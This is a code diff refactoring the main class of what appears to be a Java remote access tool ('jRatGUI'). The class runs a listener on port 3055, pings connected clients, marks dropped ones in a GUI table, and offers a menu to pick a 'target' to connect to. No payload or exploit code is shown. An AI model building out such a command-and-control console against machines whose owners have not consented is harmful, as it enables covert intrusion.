@@ -1,4 +1,4 @@
-package ServerGUI;
+package Server.ServerGUI;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -7,34 +7,17 @@ import java.net.Socket;
 import java.util.Iterator;
 import java.util.concurrent.ConcurrentHashMap;
 
-import Server.Server;
-import Server.Streams;
+import Server.ServerConnections.Server;
+import Server.ServerConnections.Streams;
+
 
 import javax.swing.*;
+import javax.swing.table.DefaultTableModel;
 
 
 public class MainClass {
 
 
-    private static void getSysInfo(){
-
-    }
-
-    private static void ping(Server server){
-        ConcurrentHashMap <Socket, Streams> map = server.getMap();
-        int i = 0;
-        for (Socket s : map.keySet()){
-            if (!map.get(s).sendMsg("PING") || map.get(s).readMsg() == null){
-                System.err.println("Client not answering: " + s.getRemoteSocketAddress());
-                System.err.flush();
-                map.remove(s);
-            }
-            else {
-                System.out.println(i + ") " + s.getRemoteSocketAddress());
-                i++;
-            }
-        }
-    }
 
     private static void connect(Server server) {
         System.out.println("\nSelect a target: [0..n]");
@@ -60,16 +43,45 @@ public class MainClass {
     }
 
 
+    public static void ping(Server server){
+        ConcurrentHashMap<Socket, Streams> map = server.getMap();
+        int i = 0;
+
+        for (Socket s : map.keySet()){
+            if (!map.get(s).sendMsg("PING") || map.get(s).readMsg() == null){
+                System.out.println("User disconnected");
+                SwingUtilities.invokeLater(() -> {
+                    JTable connectionTable = gui.getConnectionTable();
+                    for (int z=0;z<connectionTable.getRowCount();z++){
+                        if (connectionTable.getModel().getValueAt(z,0).equals(s.getInetAddress().toString())) {
+                            DefaultTableModel model = (DefaultTableModel) connectionTable.getModel();
+                            model.setValueAt("Disconnected",z,5);
+                        }
+                    }
+                });
+                map.remove(s);
+            }
+            else {
+                System.out.println(i + ") " + s.getRemoteSocketAddress());
+                i++;
+            }
+        }
+    }
+
+
     static public jRatGUI gui;
     public static void main(String[] args) {
         try {
-            SwingUtilities.invokeLater(() -> gui = new jRatGUI());
 
             Server server = new Server(3055);
+            SwingUtilities.invokeLater(() -> gui = new jRatGUI(server));
             server.startServer();
+
+
             BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
             String sel;
             while(true){
+
                 System.out.println("\nChoose an operation to execute:\ns- Stop the server\np - Show and ping connected devices\nc - Connect to a client\ne - Exit the program");
                 sel = reader.readLine();
                 switch (sel){
